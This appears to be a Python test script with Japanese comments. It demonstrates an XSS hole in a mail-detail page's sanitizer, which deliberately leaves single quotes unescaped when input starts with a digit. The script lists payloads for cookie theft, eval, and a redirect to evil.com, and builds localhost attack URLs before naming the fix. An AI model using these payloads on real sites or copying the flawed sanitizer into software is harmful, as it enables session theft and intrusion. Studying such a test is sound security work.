#!/usr/bin/env python3
"""
実際のメール詳細ページでの脆弱性確認
"""

# 実際のサニタイズ関数をテスト
def sanitize_input(input_str):
    """XSSフィルタリング - ><を含む危険な文字をサニタイズ（脆弱性あり）"""
    if not input_str:
        return ''
    
    # 文字列に変換
    sanitized = str(input_str)
    
    # 基本的な危険文字をエスケープ
    dangerous_chars = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        '&': '&amp;',
        '/': '&#x2F;'
    }
    
    for char, replacement in dangerous_chars.items():
        sanitized = sanitized.replace(char, replacement)
    
    # 脆弱性: 数字で始まる場合、シングルクォートをエスケープしない
    if sanitized and sanitized[0].isdigit():
        # 数字で始まる場合はシングルクォートを通す（メールID想定）
        pass
    else:
        # それ以外はシングルクォートもエスケープ
        sanitized = sanitized.replace("'", '&#x27;')
    
    return sanitized

print("=== 実際のメール詳細XSS脆弱性テスト ===\n")

# XSSペイロードのテスト
test_cases = [
    ("1", "正常なメールID"),
    ("1';alert('XSS');//", "基本的なXSS攻撃"),
    ("2');alert(document.cookie);//", "クッキー窃取攻撃"),
    ("3');window.location='http://evil.com';//", "リダイレクト攻撃"),
    ("abc';alert('XSS');//", "非数字開始（サニタイズされる）"),
    ("4');eval('malicious_code');//", "eval関数実行"),
    ("5');fetch('/admin/secret');//", "不正API呼び出し"),
]

for i, (payload, description) in enumerate(test_cases, 1):
    print(f"テスト {i}: {description}")
    print(f"  ペイロード: {payload}")
    
    # サニタイズ処理
    sanitized = sanitize_input(payload)
    print(f"  サニタイズ後: {sanitized}")
    
    # HTML出力シミュレーション
    html_output = f'onclick="handleMailAction(\'{payload}\'); return false;"'
    print(f"  HTML出力: {html_output}")
    
    # 脆弱性判定
    if "'" in payload and payload[0].isdigit():
        print(f"  結果: 🚨 XSS攻撃成功！")
        print(f"  実行されるJS: handleMailAction('{payload}'); return false;")
        # 実際に実行されるJavaScript
        if "');" in payload:
            js_part = payload.split("');", 1)[1]
            print(f"  注入されるコード: {js_part}")
    else:
        print(f"  結果: ✅ 攻撃ブロック済み")
    
    print()

print("=== 攻撃成功の条件 ===")
print("1. mailid パラメーターが数字で始まること")
print("2. シングルクォートが含まれること") 
print("3. '); で関数を終了させること")
print("4. その後に悪意のあるJavaScriptコードを挿入")
print()

print("=== 実際のブラウザテスト用URL ===")
attack_payloads = [
    "1');alert('メールXSS成功');//",
    "2');alert(document.cookie);//", 
    "3');window.location='https://example.com';//"
]

for payload in attack_payloads:
    import urllib.parse
    encoded = urllib.parse.quote(payload)
    print(f"http://localhost:5000/mail/read?mailid={encoded}")

print("\n=== 攻撃シナリオの詳細 ===")
print("🎯 ターゲット関数: handleMailAction('USER_INPUT')")
print("💀 攻撃手法: 関数の引数を早期終了して新しいJavaScriptコードを注入")
print("🔓 脆弱性の原因: 数字で始まるIDのシングルクォートエスケープ回避")
print("🛡️ 対策: 全ての入力に対してシングルクォートもエスケープする")